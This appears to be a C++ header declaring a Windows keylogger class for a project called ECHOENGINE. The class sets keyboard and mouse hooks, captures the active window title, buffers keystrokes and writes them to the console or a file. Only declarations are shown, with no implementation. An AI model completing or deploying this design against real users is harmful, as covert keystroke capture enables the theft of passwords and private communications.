//
// Created by ddeeaaddllyy on 03.01.2026.
//

#ifndef ECHOENGINE_KEYLOGGER_H
#define ECHOENGINE_KEYLOGGER_H

#include <windows.h>
#include <string>
#include <iostream>
#include <vector>


class KeyLogger {
public:
    KeyLogger();
    ~KeyLogger();

    // main
    bool initialize();
    void run();
    void shutdown();

    //settings
    static void setOutputToConsole(bool enable);
    static void setOutputToFile(const std::string &filename);
    static void setCaptureEnabled(bool enable);

    bool isRunning() const;
    static size_t getCapturedCount() ;

private:
    static bool installHooks();
    static void uninstallHooks();
    void processMessageLoop();

    static void triggerOutput();
    static LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);

    static std::string virtualKeyToString(DWORD vkCode);
    static std::string getActiveWindowTitle();
    static void saveLogToBuffer(const std::string& entry);
    static void printBufferedLog();

    static BOOL WINAPI consoleCtrlHandler(DWORD eventType);

private:
    static bool s_captureEnabled;
    static bool s_waitingForTrigger;
    static bool s_outputToConsole;
    static std::string s_outputFilename;

    static std::vector<std::string> s_keyLogBuffer;
    static size_t s_totalCaptured;

    static HHOOK s_keyboardHook;
    static HHOOK s_mouseHook;
    static HWND s_consoleHook;

    static CRITICAL_SECTION s_criticalSection;

    bool m_running;
    bool m_initialized;
    HWND s_consoleWindow;
};



#endif //ECHOENGINE_KEYLOGGER_H